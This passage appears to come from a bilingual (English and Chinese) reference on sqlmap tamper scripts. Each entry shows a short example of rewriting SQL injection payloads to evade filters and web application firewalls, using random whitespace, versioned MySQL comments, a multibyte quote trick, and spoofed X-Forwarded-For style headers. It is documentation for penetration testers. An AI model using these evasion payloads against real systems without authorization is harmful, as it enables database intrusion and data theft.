> Replaces (MySQL) instances of space character (' ') with a random blank character from a valid set of alternate characters

将(MySQL)空格字符('')的实例替换为有效替代字符集中的随机空白字符

Requirement:
* MySQL

Tested against:
* MySQL 5.1

```py
>>> random.seed(0)
>>> tamper('SELECT id FROM users')
'SELECT%A0id%0CFROM%0Dusers'
```

### space2mysqldash.py

> Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')

用注释（'--'）代替空格字符（''），后面是一个新行（'/n'）。

Requirement:
* MySQL
* MSSQL

```py
>>> tamper('1 AND 9227=9227')
'1--%0AAND--%0A9227=9227'
```

### space2plus.py

> Replaces space character (' ') with plus ('+')

将空格替换成 `+`

```py
>>> tamper('SELECT id FROM users')
'SELECT+id+FROM+users'
```

### space2randomblank.py

> Replaces space character (' ') with a random blank character from a valid set of alternate characters

用一组有效的备用字符中的随机空白字符替换空格字符（''）。

Tested against:
* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0

```py
>>> random.seed(0)
>>> tamper('SELECT id FROM users')
'SELECT%0Did%0CFROM%0Ausers'
```

### substring2leftright.py

> Replaces PostgreSQL SUBSTRING with LEFT and RIGHT

用 `LEFT` 和 `RIGHT` 取代 PostgreSQL 的 `SUBSTRING`

Tested against:
* PostgreSQL 9.6.12

```py
>>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 1 FOR 1)')
'LEFT((SELECT usename FROM pg_user)::text,1)'
>>> tamper('SUBSTRING((SELECT usename FROM pg_user)::text FROM 3 FOR 1)')
'LEFT(RIGHT((SELECT usename FROM pg_user)::text,-2),1)'
```

### symboliclogical.py

> Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)

将 `and` 和 `or` 的逻辑运算符分别替换为 (`&&` 和 `||`)

```py
>>> tamper("1 AND '1'='1")
"1 %26%26 '1'='1"
```

### unionalltonnion.py

> Replaces instances of UNION ALL SELECT with UNION SELECT counterpart

将 `union all select` 替换成 `union select`

```
>>> tamper('-1 UNION ALL SELECT')
'-1 UNION SELECT'
```

### unmagicquotes.py

> Replaces quote character (') with a multi-byte combo %BF%27 together with generic comment at the end (to make it work)

用多字节组合 `%BF%27` 代替引号字符(')，并在结尾处加上通用注释(以使其发挥作用)

Reference:
* http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string

```py
>>> tamper("1' AND 1=1")
'1%bf%27-- -'
```

### uppercase.py

> Replaces each keyword character with upper case value (e.g. select -> SELECT)

将关键字符替换成大写

Tested against:
* Microsoft SQL Server 2005
* MySQL 4, 5.0 and 5.5
* Oracle 10g
* PostgreSQL 8.3, 8.4, 9.0

```py
>>> tamper('insert')
'INSERT'
```

### varnish.py

> Appends a HTTP header 'X-originating-IP' to bypass Varnish Firewall

附加一个HTTP头来 X-originating-IP = "127.0.0.1" 来绕过防火墙

Reference:
* https://web.archive.org/web/20160815052159/http://community.hpe.com/t5/Protect-Your-Assets/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366

Examples:
```
>> X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)
>> X-remote-IP: TARGET_PROXY_IP (184.189.250.X)
>> X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)
>> x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)
>> X-remote-IP: * or %00 or %0A
```

### versionedkeywords.py

> Encloses each non-function keyword with (MySQL) versioned comment

Requirement:
* MySQL

Tested against:
* MySQL 4.0.18, 5.1.56, 5.5.11

```py
>>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')
'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'
```

### versionedmorekeywords.py

> Encloses each keyword with (MySQL) versioned comment

Requirement:
* MySQL >= 5.1.13

Tested against:
* MySQL 5.1.56, 5.5.11

```py
>>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')
'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'
```

### xforwardedfor.py

> Append a fake HTTP header 'X-Forwarded-For' (and alike)

附加多个虚假的 HTTP 头
```py
headers["X-Forwarded-For"] = randomIP()
headers["X-Client-Ip"] = randomIP()
headers["X-Real-Ip"] = randomIP()
headers["CF-Connecting-IP"] = randomIP()
headers["True-Client-IP"] = randomIP()
headers["Via"] = "1.1 Chrome-Compression-Proxy"
headers["CF-IPCountry"] = random.sample(('GB', 'US', 'FR', 'AU', 'CA', 'NZ', 'BE', 'DK', 'FI', 'IE', 'AT', 'IT', 'LU', 'NL', 'NO', 'PT', 'SE', 'ES', 'CH'), 1)[0]
```

---

## ACCESS

**相关文章**
- [sqlmap注入access数据库](https://www.jianshu.com/p/258d7014f84c)
- [使用SQLMap进行Access注入](https://4hou.win/wordpress/?p=17495)
